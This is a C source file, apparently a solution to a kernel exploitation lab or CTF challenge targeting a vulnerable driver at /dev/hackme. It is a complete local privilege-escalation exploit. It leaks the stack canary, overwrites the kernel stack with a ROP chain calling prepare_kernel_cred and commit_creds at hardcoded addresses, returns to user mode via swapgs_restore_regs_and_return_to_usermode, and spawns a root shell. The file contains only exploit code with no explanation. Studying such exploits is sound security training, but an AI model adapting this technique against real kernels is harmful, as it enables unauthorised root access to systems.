#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

typedef uint64_t u64;
#define VULN "/dev/hackme"
#define offset 16;
int global_fd;
u64 cookie;

u64 prepare_kernel_cred = 0xffffffff814c67f0;
u64 commit_creds = 0xffffffff814c6410;
u64 swapgs_restore_regs_and_return_to_usermode = 0xffffffff81200f10;

u64 pop_rdi_ret = 0xffffffff81006370;
u64 mov_rdi_rax_clobber_rsi140_pop1 = 0xffffffff816bf203;

void open_kn() {
  global_fd = open(VULN, O_RDWR);
  if (global_fd < 0) {
    exit(-1);
  } else {
    puts("[+] success opening!!!");
  }
}
unsigned long user_cs, user_ss, user_rflags, user_sp;

/*struct sigaction sigact;


void register_sigsegv() {
  puts("[+] Registering default action upon encountering a SIGSEGV!");
  sigact.sa_handler = spawn_shell;
  sigemptyset(&sigact.sa_mask);
  sigact.sa_flags = 0;
  sigaction(SIGSEGV, &sigact, (struct sigaction *)NULL);
}*/

void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax;");
  puts("[*] Saved state");
}
void get_shell(int signal) {
  if (getuid() == 0) {
    printf("uid: %d ,ngon\n", getuid());
    system("/bin/sh");
  } else {
    printf("chim cut :(\n");
    exit(-1);
  }
}
void read_canary() {
  uint64_t size = 30;
  u64 leak[size];
  u64 data = read(global_fd, leak, sizeof(leak));
  cookie = leak[16];
  printf("found canary: 0x%lx\n", cookie);
}

u64 user_rip = (u64)get_shell;
void write_kn() {
  unsigned n = 50;
  unsigned long payload[n];
  unsigned off = 16;
  payload[off++] = cookie;
  payload[off++] = 0x0; // rbx
  payload[off++] = 0x0; // r12
  payload[off++] = 0x0;
  payload[off++] = pop_rdi_ret;
  payload[off++] = 0x0;
  payload[off++] = prepare_kernel_cred;
  payload[off++] = mov_rdi_rax_clobber_rsi140_pop1;
  payload[off++] = 0;
  payload[off++] = commit_creds;
  payload[off++] = swapgs_restore_regs_and_return_to_usermode + 22;
  payload[off++] = 0;
  payload[off++] = 0;
  payload[off++] = user_rip;
  payload[off++] = user_cs;
  payload[off++] = user_rflags;
  payload[off++] = user_sp;
  payload[off++] = user_ss;
  u64 data = write(global_fd, payload, sizeof(payload));
  puts("[+] write success!!!");
}

int main() {
  save_state();
  // register_sigsegv();
  signal(SIGSEGV, get_shell);
  open_kn();
  read_canary();
  write_kn();
  puts("i don't think here...");
}